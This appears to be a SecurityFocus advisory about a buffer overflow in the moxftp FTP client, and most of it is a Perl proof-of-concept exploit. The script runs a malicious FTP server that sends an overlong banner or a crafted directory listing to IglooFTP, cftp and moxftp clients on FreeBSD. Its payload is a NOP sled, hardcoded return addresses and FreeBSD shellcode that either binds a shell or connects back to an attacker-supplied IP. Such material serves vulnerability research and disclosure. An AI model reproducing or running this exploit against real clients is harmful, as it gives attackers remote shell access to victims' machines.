source: http://www.securityfocus.com/bid/6921/info

A buffer overflow vulnerability has been reported for moxftp. The vulnerability occurs when moxftp is parsing 'Welcome' banner messages from remote FTP servers. When moxftp receives an overly long FTP banner, it will trigger the overflow condition.

An attacker can exploit this vulnerability by enticing a victim moxftp user to connect to a malicious FTP server.

Any attacker-supplied code will be executed on the victim system with the privileges of the moxftp process.

This vulnerability also affects xftp which is based upon moxftp. 

#!/usr/bin/perl

# PoC exploit for iglooftp, cftp and moxftp for freebsd

# moxftp / mftp 2.2
# cftp 0.12
# Iglooftp 0.6.1

# Some of the code is fucked, the passive connection is a cheap hack and will not
# respawn, so the fake ftpd will have to be restarted... (only IglooFTP)
# Some RET adr's change, this can be fixed with gdb, look into it yourself..

# all the clients are from ports.. some may have been fixed, did this shit some 
# time ago..

# thanks to kokanin for help and advice
# code by inv[at]dtors

use IO::Socket;

sub convert_ret {
my($ret) = @_;
    
    for ($x=8; $x>0; $x=$x-2){
	$ret = substr($ret_temp,$x,2);
	$new_ret .= chr hex "$ret";
    }
return $new_ret;
}

sub convert_ip {
my($ip) = @_;

@ip_tmp = split(/\./, $ip);

for($x=0; $x<4; $x++) {
    $new_ip .= chr @ip_tmp[$x];
}
return $new_ip;
}

$server_port = 21;
$passive_server_port = 10324;

unless(@ARGV == 3 || @ARGV == 2) 
{ die 
"Usage ./DSR-ftp_clients.pl Shellcode Client Ip\n
\tShellcode:\t0 = Portbind
\t\t\t1 = Connect back\n
\tClient:\t\t0 = IglooFTP (FreeBSD 4.7)
\t\t\t1 = cftp (FreeBSD 4.7)
\t\t\t2 = Moxftp (FreeBSD 4.7)
\t\t\t3 = cftp (FreeBSD 5.0)
\t\t\t4 = IglooFTP (FreeBSD 5.0)
\t\t\t5 = Moxftp (FreeBSD 5.0)\n"
}

($shellcode_arg, $client_arg, $extra_arg) = @ARGV;

$user_ip = convert_ip($extra_arg);

@shellcode_list = (
    "Portbind,\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x52\x66\x68\x27\x10\x66\x51\x89\xe6\xb1\x10\x51\x56\x50\x50\xb0\x68\xcd\x80\x51\x53\x53\xb0\x6a\xcd\x80\x52\x52\x53\x53\xb0\x1e\xcd\x80\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80",
    "Connect Back,\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68"."$user_ip"."\x66\x68\x27\x10\x66\x51\x89\xe6\xb2\x10\x52\x56\x50\x50\xb0\x62\xcd\x80\x41\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80");

@client_list = (
    "IglooFTP - FreeBSD 4.7,188,0xbfbfc560,0",
    "cftp - FreeBSD 4.7,8192,0xbfbffb04,1,300",
    "mftp - FreeBSD 4.7,516,0xbfbff8e0,1,100",
    "cftp - FreeBSD 5.0,8196,0xbfbffa30,1,300",
    "IglooFTP - FreeBSD 5.0,212,0xbfbfc440,0",
    "mftp - FreeBSD 5.0,532,0xbfbff950,1,100");

@client_info = split(/,/,@client_list[$client_arg]);
@shellcode_info = split(/,/,@shellcode_list[$shellcode_arg]);

print "\tDSR-ftp_clients by inv\n
Setting up Service on Port: $server_port
Client: @client_info[0]
Using Shellcode: @shellcode_info[0]
Using Offset: @client_info[2]\n";

$shellcode = @shellcode_info[1];
$shellcode_length = length($shellcode);

$nop_count = @client_info[1] - $shellcode_length - 8;
$nops = "\x90"x$nop_count;

$ret_temp = @client_info[2];
$ret = substr($ret_temp,2,8);
$ret = convert_ret($ret);
$ret = "$ret"x2;

if(@client_info[3] eq "1") {
    $nops_x = "\x90"x@client_info[1];
    $nops_y = "\x90"x@client_info[4];
    $exploit_string = "$nops_x"."$ret"."$nops_y"."$shellcode";
}

if($client_arg == 0 or $client_arg == 4) {
	$exploit_string ="total 666
drwxr-xr-x	25 root wheel	1536 Jan 28 00:13 .
drwxr-xr-x	14 root wheel	 512 Jan 28 00:13 ..
-rwxr-xr-x	 2 inv	inv	 512 Jan 29 01:00 $nops$shellcode$ret";
}

$server = IO::Socket::INET->new(LocalPort => $server_port,
                                Type    => SOCK_STREAM,
                                Reuse   => 1,
                                Listen  => 10)
or die "Can't listen on $server_port : $!\n";

while ($client = $server->accept()) {
    
    if(@client_info[3] == 1) {
	print $client "220 $exploit_string\n";
    }
    
    if(@client_info[3] eq "0") {
	print $client "220 0xdeadcode\n";
	while($request !=~ /QUIT/i) {
	    $request = <$client>;
	    print $request;
	    
	    if($request =~ /PASS/i) {
		print $client "230 User anonymous logged in.\n";
	    }
	    
	    if($request =~ /USER/i) {
		print $client "331 Password required for anonymous.\n";
	    }
	
	    if($request =~ /SYST/i) {
		print $client "215 UNIX Type: L8\n";
	    }
	
	    if($request =~ /REST/i) {
		print $client "350 Restarting.\n";
	    }
	
	    if($request =~ /TYPE/i) {
		    print $client "200 Type set to A.\n";
	    }
	    
	    if($request =~ /PWD/i or $request =~ /FEAT/i) {
		print $client "257 \"/usr/home/inv/\" is current directory.\n";
	    }
	
	    if($request =~ /PASV/i) {
		$passive_server = IO::Socket::INET->new(LocalPort => $passive_server_port,
					Type 	=> SOCK_STREAM,
					Reuse 	=> 1,
					Listen 	=> 10)
		or die "Can't open passive port";
		print $client "227 Entering Passive Mode (127,0,0,1,40,84)\n";
	    }
	    
	    if ($request =~ /LIST/i) {
		while($passive_client = $passive_server->accept()){
		    print $client "150 Starting transfer.\n";    
		    print $passive_client $exploit_string;
		    close $passive_client;
		    print $client "226 BANG YOU ARE DEAD!!!\n";
		}
	    }	
	
	}
    close $client;
    }
}
